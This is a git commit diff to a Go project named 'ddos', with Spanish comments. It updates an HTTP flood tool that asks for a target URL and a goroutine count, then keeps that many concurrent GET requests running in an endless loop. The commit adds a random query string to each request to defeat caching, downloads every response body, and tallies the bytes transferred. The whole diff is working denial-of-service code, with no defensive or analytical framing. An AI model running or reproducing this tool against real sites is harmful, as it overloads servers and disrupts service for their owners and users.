2f3034b2989b878bdfe1a5f596237ef1b5fc5a00
El Chino <cristian.lescano@incluit.com>
2024-05-06 15:14:58 -0300

    mejoras en la salida de la info

--- go.mod
+++ go.mod
@@ -1,3 +1,10 @@
 module github.com/cristianlescano/ddos
 
 go 1.22.0
+
+require (
+	github.com/cockroachdb/apd v1.1.0 // indirect
+	github.com/leekchan/accounting v1.0.0 // indirect
+	github.com/pkg/errors v0.8.1 // indirect
+	github.com/shopspring/decimal v0.0.0-20180709203117-cd690d0c9e24 // indirect
+)
--- main.go
+++ main.go
@@ -2,15 +2,18 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"math/rand"
 	"net/http"
 	"os"
 	"strconv"
 	"time"
+
+	"github.com/leekchan/accounting"
 )
 
-func fetch(url string, ch chan bool, countCh chan int, sleep int) {
-	resp, err := http.Get(url)
+func fetch(url string, ch chan bool, sleep int, sizeMB chan float64) {
+	resp, err := http.Get(url + "?random=" + strconv.Itoa(rand.Intn(1000000000)))
 	if err != nil {
 		//fmt.Printf("Error al obtener la URL %s: %s\n", url, err)
 		ch <- false // Indicar al canal que la solicitud ha fallado
@@ -18,11 +21,13 @@ func fetch(url string, ch chan bool, countCh chan int, sleep int) {
 	}
 	defer resp.Body.Close()
 	time.Sleep(time.Duration(sleep) * time.Millisecond)
-	// Incrementar el contador
-	countCh <- 1
 
-	// No almacenar el contenido, solo imprimir el estado de la respuesta
-	//fmt.Printf("Descargado: %s - Estado: %s\n", url, resp.Status)
+	body, _ := io.ReadAll(resp.Body)
+
+	size := len(body)                // tamaño en bytes
+	sizeKB := float64(size) / 1024.0 // tamaño en kilobytes
+	sizeMB <- (sizeKB / 1024.0)      // tamaño en megabytes
+
 	if resp.StatusCode != 200 {
 		ch <- false // Indicar al canal que la solicitud ha fallado
 	} else {
@@ -36,10 +41,6 @@ func main() {
 	var urlScan string
 	fmt.Print("url: ")
 	fmt.Scanf("%s\n", &urlScan)
-
-	//concateno un numero random automaticamente para que no se cachee la url
-	rand.Seed(time.Now().UnixNano())
-	url := urlScan + "?random=" + strconv.Itoa(rand.Intn(1000000000))
 
 	// Definir la cantidad de goroutines (hilos) a abrir
 	var numGoroutinesInput string
@@ -62,17 +63,26 @@ func main() {
 	// Crear un canal para comunicarse entre las goroutines y el hilo principal
 	ch := make(chan bool)
 
-	// Crear un canal para contar la cantidad de solicitudes exitosas
-	countCh := make(chan int)
+	// Crear un canal mostrar el tamaño de la respuesta
+	sizeMB := make(chan float64)
 
 	// Iniciar 10 goroutines
 	for i := 0; i < numGoroutines; i++ {
-		go fetch(url, ch, countCh, numSleep)
+		go fetch(urlScan, ch, numSleep, sizeMB)
 	}
 
+	ac := accounting.Accounting{
+		Symbol:    "",  //El símbolo
+		Precision: 0,   // ¿Cuántos "centavos" queremos? (también llamado precisión)
+		Thousand:  ".", //Separador de miles
+		Decimal:   "",  //Separador de decimales
+
+	}
 	// Mantener siempre 10 goroutines activas
 	totalRequests := 0
 	totalRequestsErr := 0
+	totalSize := 0.0
+	sizeProm := 0.0
 	for {
 		select {
 		case success := <-ch:
@@ -83,11 +93,15 @@ func main() {
 				totalRequestsErr++
 			}
 			// Lanzar una nueva goroutine para reemplazarla
-			go fetch(url, ch, countCh, numSleep)
-		case count := <-countCh:
-			// Imprimir el total de solicitudes exitosas
-			fmt.Fprintf(os.Stdout, "\rTotal de solicitudes exitosas: %d, Errores: %d ", totalRequests+count, totalRequestsErr)
+			go fetch(urlScan, ch, numSleep, sizeMB)
+
+		case size := <-sizeMB:
+			totalSize += size
+			sizeProm = size * 1024
 		}
+		sTotalRquests := ac.FormatMoney(totalRequests)
+		sTotalRquestsErr := ac.FormatMoney(totalRequestsErr)
+		fmt.Fprintf(os.Stdout, "\rTotal de solicitudes exitosas: %s | Errores: %s | Tamaño:  %.2f KB | Transferido: %.2f MB ", sTotalRquests, sTotalRquestsErr, sizeProm, totalSize)
 	}
 }
 
